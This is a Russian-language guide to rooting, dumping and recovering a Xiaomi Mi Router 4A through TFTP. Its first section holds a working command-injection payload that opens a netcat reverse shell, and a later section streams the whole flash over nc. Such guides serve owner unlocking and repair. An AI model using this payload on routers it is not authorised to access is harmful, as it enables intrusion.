# Инструкция по эксплуатации и восстановлению Xiaomi Mi Router 4A (Gigabit Edition)
# Данное руководство содержит методы ручного получения доступа (Reverse Shell), создания резервных копий и аварийного восстановления прошивки.

## 1. Эксплуатация уязвимости (Reverse Shell)

  Если автоматические скрипты [OpenWRTInvasion](https://github.com/acecilia/OpenWRTInvasion) не открывают даже Telnet, используйте инъекцию через параметр stok в веб-интерфейсе.

### Шаг 1: Подготовка слушателя на ПК

  Откройте терминал и запустите прослушивание порта:
  ```shell
  nc -lvnp 4445
  ```

### Шаг 2: Получение токена (stok)

  Авторизуйтесь в панели управления роутером (192.168.31.1). Скопируйте значение токена из адресной строки (набор символов между ;stok= и /).

### Шаг 3: Выполнение команды

  Подставьте ваш stok и локальный IP вашего компьютера в команду ниже и выполните её в терминале:
  ```shell
  curl "http://192.168.31.1/cgi-bin/luci/;stok=<ВАШ_STOK>/api/misystem/set_config_iotdev?bssid=12:34:56:78:90:AB&user_id=1234&ssid=%0Amknod%20/tmp/p%20p%3Bnc%20<ВАШ_IP>%204445%200%3C/tmp/p%7C/bin/sh%201%3E/tmp/p%202%3E/tmp/p%0A"
  ```

## 2. ОБЯЗАТЕЛЬНО: Создание дампа памяти

  Перед любыми манипуляциями с прошивкой необходимо сделать полный дамп. Если вы прошьете битый загрузчик, роутер превратится в «кирпич», который оживет только через программатор при наличии этого дампа.

  Для проверки разделов введите на роутере: cat /proc/mtd.
  Обычно структура выглядит так:
```
  dev: size erasesize name

  mtd0: 01000000 00010000 "ALL" (Это вся флеш-память, 16МБ)

  mtd1: 00030000 00010000 "Bootloader"

  mtd4: 00010000 00010000 "factory" (Здесь лежат уникальные калибровки Wi-Fi/EEPROM)
```
  Копирование дампа на компьютер через сеть (dd + nc):

  На стороне ПК (прием файла):
  ```shell
  nc -l -p 5555 > full_dump_r4a.bin
  ```

  На стороне роутера (отправка данных):
  ```shell
  dd if=/dev/mtdblock0 | nc <ВАШ_IP> 5555
  ```

  Использование mtdblock0 гарантирует создание полной копии всей памяти.

## 3. Перенос файлов на роутер

  Для загрузки кастомных прошивок или загрузчика (Breed) на роутер:

  На ПК: Запустите сервер в папке с файлами: `python3 -m http.server 8000`

  На роутере: Скачайте файл в оперативную память:
  ```shell
  cd /tmp
  wget http://<ВАШ_IP>:8000/breed.bin
  ```

## 4. Восстановление (Debrick) через TFTP на Linux

  Если роутер «окирпичен» (не грузится система), но загрузчик жив, используйте dnsmasq.

  Подготовка

  [Скачайте стоковую прошивку](https://miuirom.org/miwifi/mi-router-4a-gigabit).

  Создайте папку (например, /srv/tftp/), положите туда файл и переименуйте его в `miwifi.bin`.

  Установите статический IP на сетевом интерфейсе ПК: 192.168.31.100.

  Файл конфигурации dnsmasq.conf
  ```shell
  interface=enp9s0 # Ваш сетевой интерфейс
  bind-interfaces
  dhcp-range=192.168.31.10,192.168.31.200,255.255.255.0,12h
  dhcp-boot=miwifi.bin
  enable-tftp
  tftp-root=/srv/tftp # Путь к вашей папке с прошивкой
  tftp-unique-root
  ```

Процесс прошивки

Мониторинг: Запустите `sudo tcpdump -i enp9s0 -lnnv`, чтобы видеть активность роутера.

Запуск: Зажмите Reset на выключенном роутере и вставьте кабель питания.

Когда в логах tcpdump появятся упоминания U-Boot, немедленно запустите сервер:

`sudo dnsmasq -C dnsmasq.conf -d`


Результат:

Если в логах dnsmasq появилось sent — роутер принимает файл.

Оранжевый индикатор: Идет процесс записи в память. Ждите.

Мигающий красный: Ошибка (неверный регион прошивки или таймаут).
